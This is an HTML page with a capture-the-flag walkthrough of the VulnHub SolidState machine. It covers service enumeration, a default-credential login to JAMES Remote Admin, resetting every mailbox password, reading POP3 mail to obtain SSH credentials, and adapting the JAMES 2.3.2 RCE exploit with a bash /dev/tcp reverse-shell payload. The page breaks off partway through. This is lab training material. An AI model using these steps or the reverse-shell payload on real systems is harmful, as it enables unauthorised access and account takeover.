    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
      
      <label class="md-nav__link" for="__nav_5">
        Blue Teaming
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Blue Teaming" data-md-level="1">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          Blue Teaming
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../blue-teaming/index.html" class="md-nav__link">
        __index__
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="https://www.blueteamsacademy.com" class="md-nav__link">
        Blue Team Training
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../../about/index.html" class="md-nav__link">
        About Me
      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    Enumeration
  </a>
  
    <nav class="md-nav" aria-label="Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#openning-services" class="md-nav__link">
    Openning Services
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-application" class="md-nav__link">
    Web Application
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#james-server" class="md-nav__link">
    JAMES Server
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#foothold" class="md-nav__link">
    Foothold
  </a>
  
    <nav class="md-nav" aria-label="Foothold">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#mailbox-to-ssh-credential" class="md-nav__link">
    Mailbox to SSH credential
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    Privilege escalation
  </a>
  
    <nav class="md-nav" aria-label="Privilege escalation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#james-server-rce-to-bypass-retrict-bash" class="md-nav__link">
    James server RCE to bypass retrict bash
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-pspy-to-monitor-process" class="md-nav__link">
    Using pspy to monitor process
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
                
                
                <h1 id="vulnhub-solidstate-1"><a href='https://www.vulnhub.com/entry/solidstate-1,261/' target="blank">VulnHub SolidState: 1</a></h1>
<blockquote>
<p>Author: Hades</p>
<p><a href="https://github.com/leecybersec/scripting"><em>Scripting here</em></a></p>
</blockquote>
<h2 id="enumeration">Enumeration</h2>
<h3 id="openning-services">Openning Services</h3>
<div class="highlight"><pre><span></span><code>┌──(Hades㉿192.168.11.140)-[1.4:12.0]~/bash-script
└─$ sudo ./auto_enum.sh 192.168.11.141

Scanning openning port ...
[+] Openning ports: 22,25,80,110,119,4555
</code></pre></div>
<div class="highlight"><pre><span></span><code>┌──(Hades㉿192.168.11.140)-[5.1:12.1]~/bash-script
└─$ nmap -sC -sV 192.168.11.141 -p22,25,80,110,119,4555
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 06:41 EDT
Nmap scan report for 192.168.11.141
Host is up (0.00031s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (192.168.11.140 [192.168.11.140]), PIPELINING, ENHANCEDSTATUSCODES, 
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.47 seconds
</code></pre></div>
<h3 id="web-application">Web Application</h3>
<p><img alt="" src="img/1.png" /></p>
<p>[+] Files and directories</p>
<div class="highlight"><pre><span></span><code>gobuster dir -k -u http://192.168.11.141:80 -w /usr/share/seclists/Discovery/Web-Content/common.txt                                                                         
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:                     http://192.168.11.141:80
<span class="o">[</span>+<span class="o">]</span> Method:                  GET
<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
<span class="o">===============================================================</span>
<span class="m">2021</span>/03/16 <span class="m">09</span>:34:06 Starting gobuster <span class="k">in</span> directory enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
/.hta                 <span class="o">(</span>Status: <span class="m">403</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">293</span><span class="o">]</span>
/.htpasswd            <span class="o">(</span>Status: <span class="m">403</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">298</span><span class="o">]</span>
/.htaccess            <span class="o">(</span>Status: <span class="m">403</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">298</span><span class="o">]</span>
/assets               <span class="o">(</span>Status: <span class="m">301</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">317</span><span class="o">]</span> <span class="o">[</span>--&gt; http://192.168.11.141/assets/<span class="o">]</span>
/images               <span class="o">(</span>Status: <span class="m">301</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">317</span><span class="o">]</span> <span class="o">[</span>--&gt; http://192.168.11.141/images/<span class="o">]</span>
/index.html           <span class="o">(</span>Status: <span class="m">200</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">7776</span><span class="o">]</span>                                   
/server-status        <span class="o">(</span>Status: <span class="m">403</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">302</span><span class="o">]</span>                                    

<span class="o">===============================================================</span>
<span class="m">2021</span>/03/16 <span class="m">09</span>:34:07 <span class="nv">Finished</span>
<span class="o">===============================================================</span>
</code></pre></div>
<p>[+] All URLs</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Home - Solid State Security<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>                                                                                                                                  
<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;assets/css/main.css&quot;</span> <span class="p">/&gt;</span>
<span class="c">&lt;!--[if lte IE 9]&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;assets/css/ie9.css&quot; /&gt;&lt;![endif]--&gt;</span>
<span class="c">&lt;!--[if lte IE 8]&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;assets/css/ie8.css&quot; /&gt;&lt;![endif]--&gt;</span>
<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;index.html&quot;</span><span class="p">&gt;</span>Solid State Security<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#menu&quot;</span><span class="p">&gt;</span>Menu<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;index.html&quot;</span><span class="p">&gt;</span>Home<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;services.html&quot;</span><span class="p">&gt;</span>Services<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;about.html&quot;</span><span class="p">&gt;</span>About Us<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;close&quot;</span><span class="p">&gt;</span>Close<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;image&quot;</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;images/pic01.jpg&quot;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="p">/&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;image&quot;</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;images/pic02.jpg&quot;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="p">/&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;image&quot;</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;images/pic03.jpg&quot;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="p">/&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;image&quot;</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;images/pic04.jpg&quot;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="p">/&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;services.html&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;special&quot;</span><span class="p">&gt;</span>Learn more<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;image&quot;</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;images/pic05.jpg&quot;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="p">/&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;services.html&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;special&quot;</span><span class="p">&gt;</span>Learn more<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;image&quot;</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;images/pic06.jpg&quot;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="p">/&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;services.html&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;special&quot;</span><span class="p">&gt;</span>Learn more<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;image&quot;</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;images/pic07.jpg&quot;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="p">/&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;services.html&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;special&quot;</span><span class="p">&gt;</span>Learn more<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;services.html&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;button&quot;</span><span class="p">&gt;</span>Browse All<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;fa-envelope&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#&quot;</span><span class="p">&gt;</span>webadmin@solid-state-security.com<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="james-server">JAMES Server</h3>
<p>SMTP</p>
<div class="highlight"><pre><span></span><code>nmap 192.168.11.141 -p25 --script=smtp-*
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-16 09:33 EDT
Nmap scan report for 192.168.11.141
Host is up (0.00032s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-commands: solidstate Hello nmap.scanme.org (192.168.11.140 [192.168.11.140]), PIPELINING, ENHANCEDSTATUSCODES, 
| smtp-enum-users: 
|_  root
|_smtp-open-relay: Server is an open relay (4/16 tests)
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
MAC Address: 00:0C:29:E1:D2:9B (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.68 seconds
</code></pre></div>
<p>JAMES Remote Admin</p>
<p>Using JAMES Service, I tried the default credentials of JAMES Remote Admin <code>root:root</code> and gained the access.</p>
<div class="highlight"><pre><span></span><code>┌──(Hades㉿192.168.11.140)-[1.0:15.8]~
└─$ nc -nv 192.168.11.141 4555
(UNKNOWN) [192.168.11.141] 4555 (?) open
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
</code></pre></div>
<h2 id="foothold">Foothold</h2>
<h3 id="mailbox-to-ssh-credential">Mailbox to SSH credential</h3>
<p>In the JAMES Remote Admin, I changed all user's passwd to 123456.</p>
<div class="highlight"><pre><span></span><code>listusers

Existing accounts 6
user: james
user: thomas
user: john
user: mindy
user: mailadmin
setpassword james 123456
Password for james reset
setpassword thomas 123456
Password for thomas reset
setpassword john 123456
Password for john reset
setpassword mindy 123456
Password for mindy reset
setpassword mailadmin 123456
Password for mailadmin reset
</code></pre></div>
<p>Revew mailbox and gather more information.</p>
<div class="tabbed-set" data-tabs="1:6"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><label for="__tabbed_1_1">script</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code>┌──(Hades㉿192.168.11.140)-[0.4:30.2]~/bash-script/mailbox
└─$ python mailbox.py 192.168.11.141
MailBox: james
+OK 0 0

MailBox: thomas
+OK 0 0

MailBox: john
+OK 1 743

Mail: 1
1 743
.
+OK Message follows
Return-Path: &lt;mailadmin@localhost&gt;
Message-ID: &lt;9564574.1.1503422198108.JavaMail.root@solidstate&gt;
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for &lt;john@localhost&gt;;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy&#39;s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.

MailBox: mindy
+OK 2 1945

Mail: 1
1 1109
2 836
.
+OK Message follows
Return-Path: &lt;mailadmin@localhost&gt;
Message-ID: &lt;5420213.0.1503422039826.JavaMail.root@solidstate&gt;
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for &lt;mindy@localhost&gt;;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.

Mail: 2
+OK Message follows
Return-Path: &lt;mailadmin@localhost&gt;
Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for &lt;mindy@localhost&gt;;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.

MailBox: mailadmin
+OK 0 0
</code></pre></div>
</div>
<input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><label for="__tabbed_1_2">james</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>Hades㉿192.168.11.140<span class="o">)</span>-<span class="o">[</span><span class="m">3</span>.1:21.7<span class="o">]</span>~
└─$ nc -nC <span class="m">192</span>.168.11.141 <span class="m">110</span>                                                                                                                                           <span class="m">1</span> ⨯
+OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server <span class="m">2</span>.3.2<span class="o">)</span> ready 
user james
+OK
pass <span class="m">123456</span>
+OK Welcome james
list
+OK <span class="m">0</span> <span class="m">0</span>
.
quit
+OK Apache James POP3 Server signing off.
</code></pre></div>
</div>
<input id="__tabbed_1_3" name="__tabbed_1" type="radio" /><label for="__tabbed_1_3">thomas</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>Hades㉿192.168.11.140<span class="o">)</span>-<span class="o">[</span><span class="m">3</span>.1:21.8<span class="o">]</span>~
└─$ nc -nC <span class="m">192</span>.168.11.141 <span class="m">110</span>
+OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server <span class="m">2</span>.3.2<span class="o">)</span> ready 
user thomas
+OK
pass <span class="m">123456</span>
+OK Welcome thomas
list
+OK <span class="m">0</span> <span class="m">0</span>
.
quit
+OK Apache James POP3 Server signing off.
</code></pre></div>
</div>
<input id="__tabbed_1_4" name="__tabbed_1" type="radio" /><label for="__tabbed_1_4">john</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>Hades㉿192.168.11.140<span class="o">)</span>-<span class="o">[</span><span class="m">3</span>.1:21.8<span class="o">]</span>~
└─$ nc -nC <span class="m">192</span>.168.11.141 <span class="m">110</span>
+OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server <span class="m">2</span>.3.2<span class="o">)</span> ready 
user john
+OK
pass <span class="m">123456</span>
+OK Welcome john
list
+OK <span class="m">1</span> <span class="m">743</span>
<span class="m">1</span> <span class="m">743</span>
.
retr <span class="m">1</span>
+OK Message follows
Return-Path: &lt;mailadmin@localhost&gt;
Message-ID: &lt;<span class="m">9564574</span>.1.1503422198108.JavaMail.root@solidstate&gt;
MIME-Version: <span class="m">1</span>.0
Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from <span class="m">192</span>.168.11.142 <span class="o">([</span><span class="m">192</span>.168.11.142<span class="o">])</span>
          by solidstate <span class="o">(</span>JAMES SMTP Server <span class="m">2</span>.3.2<span class="o">)</span> with SMTP ID <span class="m">581</span>
          <span class="k">for</span> &lt;john@localhost&gt;<span class="p">;</span>
          Tue, <span class="m">22</span> Aug <span class="m">2017</span> <span class="m">13</span>:16:20 -0400 <span class="o">(</span>EDT<span class="o">)</span>
Date: Tue, <span class="m">22</span> Aug <span class="m">2017</span> <span class="m">13</span>:16:20 -0400 <span class="o">(</span>EDT<span class="o">)</span>
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy<span class="err">&#39;</span>s access <span class="k">until</span> she gets <span class="nb">read</span> on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you <span class="k">in</span> advance.

Respectfully,
James

.
quit
+OK Apache James POP3 Server signing off.
</code></pre></div>
</div>
<input id="__tabbed_1_5" name="__tabbed_1" type="radio" /><label for="__tabbed_1_5">mindy</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>Hades㉿192.168.11.140<span class="o">)</span>-<span class="o">[</span><span class="m">3</span>.1:21.8<span class="o">]</span>~
└─$ nc -nC <span class="m">192</span>.168.11.141 <span class="m">110</span>
+OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server <span class="m">2</span>.3.2<span class="o">)</span> ready 
user mindy
+OK
pass <span class="m">123456</span>
+OK Welcome mindy
list
+OK <span class="m">2</span> <span class="m">1945</span>
<span class="m">1</span> <span class="m">1109</span>
<span class="m">2</span> <span class="m">836</span>
.
retr <span class="m">1</span>
+OK Message follows
Return-Path: &lt;mailadmin@localhost&gt;
Message-ID: &lt;<span class="m">5420213</span>.0.1503422039826.JavaMail.root@solidstate&gt;
MIME-Version: <span class="m">1</span>.0
Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from <span class="m">192</span>.168.11.142 <span class="o">([</span><span class="m">192</span>.168.11.142<span class="o">])</span>
          by solidstate <span class="o">(</span>JAMES SMTP Server <span class="m">2</span>.3.2<span class="o">)</span> with SMTP ID <span class="m">798</span>
          <span class="k">for</span> &lt;mindy@localhost&gt;<span class="p">;</span>
          Tue, <span class="m">22</span> Aug <span class="m">2017</span> <span class="m">13</span>:13:42 -0400 <span class="o">(</span>EDT<span class="o">)</span>
Date: Tue, <span class="m">22</span> Aug <span class="m">2017</span> <span class="m">13</span>:13:42 -0400 <span class="o">(</span>EDT<span class="o">)</span>
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst.
Your role is critical <span class="k">in</span> fulfilling the mission of our orginzation.
The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will <span class="nb">help</span> you make a smooth transition into your new role.
The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
retr <span class="m">2</span>
+OK Message follows
Return-Path: &lt;mailadmin@localhost&gt;
Message-ID: &lt;<span class="m">16744123</span>.2.1503422270399.JavaMail.root@solidstate&gt;
MIME-Version: <span class="m">1</span>.0
Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from <span class="m">192</span>.168.11.142 <span class="o">([</span><span class="m">192</span>.168.11.142<span class="o">])</span>
          by solidstate <span class="o">(</span>JAMES SMTP Server <span class="m">2</span>.3.2<span class="o">)</span> with SMTP ID <span class="m">581</span>
          <span class="k">for</span> &lt;mindy@localhost&gt;<span class="p">;</span>
          Tue, <span class="m">22</span> Aug <span class="m">2017</span> <span class="m">13</span>:17:28 -0400 <span class="o">(</span>EDT<span class="o">)</span>
Date: Tue, <span class="m">22</span> Aug <span class="m">2017</span> <span class="m">13</span>:17:28 -0400 <span class="o">(</span>EDT<span class="o">)</span>
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system.
Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
quit
+OK Apache James POP3 Server signing off.
</code></pre></div>
</div>
<input id="__tabbed_1_6" name="__tabbed_1" type="radio" /><label for="__tabbed_1_6">mailadmin</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>Hades㉿192.168.11.140<span class="o">)</span>-<span class="o">[</span><span class="m">3</span>.1:21.8<span class="o">]</span>~
└─$ nc -nC <span class="m">192</span>.168.11.141 <span class="m">110</span>
+OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server <span class="m">2</span>.3.2<span class="o">)</span> ready 
user mailadmin
+OK
pass <span class="m">123456</span>
+OK Welcome mailadmin
list
+OK <span class="m">0</span> <span class="m">0</span>
.
quit
+OK Apache James POP3 Server signing off.
</code></pre></div>
</div>
</div>
<p>At here, I had a ssh credential <code>mindy:P@55W0rd1!2@</code></p>
<div class="highlight"><pre><span></span><code>ssh mindy@192.168.11.141
</code></pre></div>
<p><img alt="" src="img/2.png" /></p>
<h2 id="privilege-escalation">Privilege escalation</h2>
<h3 id="james-server-rce-to-bypass-retrict-bash">James server RCE to bypass retrict bash</h3>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>Hades㉿192.168.11.140<span class="o">)</span>-<span class="o">[</span><span class="m">0</span>.6:16.0<span class="o">]</span>~
└─$ searchsploit JAMES <span class="m">2</span>.3.2
------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                           <span class="p">|</span>  Path
------------------------------------------------------------------------- ---------------------------------
Apache James Server <span class="m">2</span>.3.2 - Insecure User Creation Arbitrary File Write  <span class="p">|</span> linux/remote/48130.rb
Apache James Server <span class="m">2</span>.3.2 - Remote Command Execution                     <span class="p">|</span> linux/remote/35513.py
------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre></div>
<p>Exploit <code>linux/remote/35513.py</code> need a user login to the system to run the payload.</p>
<div class="tabbed-set" data-tabs="2:2"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio" /><label for="__tabbed_2_1">Modify and execute poc</label><div class="tabbed-content">
<p>Change payload to execute reverse shell</p>
<div class="highlight"><pre><span></span><code><span class="nv">payload</span> <span class="o">=</span> <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/192.168.11.140/8080 0&gt;&amp;1&#39;</span> <span class="c1"># to exploit on any user</span>
</code></pre></div>
<p>Open listener and execute payload</p>
